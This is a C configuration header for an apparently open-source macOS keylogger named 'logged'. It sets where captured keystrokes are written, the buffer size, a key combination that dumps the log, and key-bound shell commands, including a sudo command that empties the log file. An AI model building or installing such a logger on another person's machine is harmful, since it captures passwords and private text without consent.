/*   _                                       _
 *  | | https://github.com/NewDawn0/logged  | |
 *  | |   / _ \   / _` |  / _` |  / _ \  / _` |
 *  | |_ | (_) | | (_| | | (_| | |  __/ | (_| |
 *  |___| \___/   \__, |  \__, |  \___|  \__,_|
 *                |___/   |___/
 *
 *  File: config.h
 *  Desc: Configuration for the keylogger
 */

#include <stdbool.h>
typedef struct {
  const char *key;
  const char *cmd;
} ExecKey;

/*========= Configuration =========*/
const char *LOG_FILE_PATH =
    "/var/log/logger.log"; // Where the log file is stored
const int BUFSIZE =
    20; // Amount of characters until the buffer of keys is logged to the file
const bool DEBUG = true; // If debug messages should be printed

// Keybinds:
// NOTE: do not separate the keys with a space as it will not work
// The special keys are: cmd, shift, caps, ctrl, alt
const char *DUMP = "cmd+9"; // Key combination which dumps all the keys

// Exec Keys
// Using ExecKeys you can define keys and commands are run when the key is
// pressed These are just some example commands for demonstration
ExecKey EXEC_KEYS[] = {
    {"cmd+shift+c", "sudo cat /dev/null > /var/log/logger.log"}, // clear log
    {"alt+shift+g", "sudo echo hi"},    // runs a command with root permissions
    {"alt+shift+g", "ping google.com"}, // runs command with normal permissions
};
